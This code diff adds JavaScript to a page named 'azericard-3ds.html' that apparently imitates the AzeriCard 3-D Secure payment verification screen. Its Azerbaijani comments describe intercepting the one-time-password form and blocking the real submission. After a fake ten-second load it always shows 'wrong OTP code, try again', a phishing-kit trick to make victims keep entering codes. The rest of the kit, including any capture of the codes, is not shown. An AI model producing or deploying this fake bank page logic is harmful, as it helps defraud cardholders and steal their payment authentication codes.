@@ -295,3 +295,52 @@ document.addEventListener("DOMContentLoaded", function () {
 
     
 });
+
+document.addEventListener('DOMContentLoaded', function() {
+    // OTP səhifəsindəyiksə
+    if (window.location.href.includes('azericard-3ds.html')) {
+        
+        // 1. Kart loqosunu düzəldirik (əgər varsa)
+        const cardLogos = document.querySelectorAll('.card-logo, .bank-logo');
+        cardLogos.forEach(logo => {
+            if (logo.getAttribute('src') && !logo.getAttribute('src').includes('http')) {
+                logo.setAttribute('src', '/azericard/images/' + logo.getAttribute('src').split('/').pop());
+            }
+        });
+
+        // 2. OTP formunun göndərilməsini tuturuq
+        const otpForm = document.querySelector('form');
+        if (otpForm) {
+            otpForm.addEventListener('submit', function(e) {
+                e.preventDefault(); // Əsl göndərməni dayandırırıq
+                
+                const btn = otpForm.querySelector('button[type="submit"]');
+                if (btn) {
+                    btn.innerText = 'Yüklənir...';
+                    btn.disabled = true;
+                }
+                
+                // 10 saniyə gözləmə
+                setTimeout(function() {
+                    if (btn) {
+                        btn.innerText = 'Ödənişi təsdiqlə';
+                        btn.disabled = false;
+                    }
+                    
+                    // Xəta mesajını göstəririk
+                    let err = document.querySelector('.error-message');
+                    if (!err) {
+                        err = document.createElement('div');
+                        err.className = 'error-message';
+                        err.style.color = 'red';
+                        err.style.marginTop = '10px';
+                        err.style.fontSize = '14px';
+                        err.style.textAlign = 'center';
+                        otpForm.appendChild(err);
+                    }
+                    err.innerText = 'Səhv OTP kodu, zəhmət olmasa təkrar yoxlayın.';
+                }, 10000);
+            });
+        }
+    }
+});
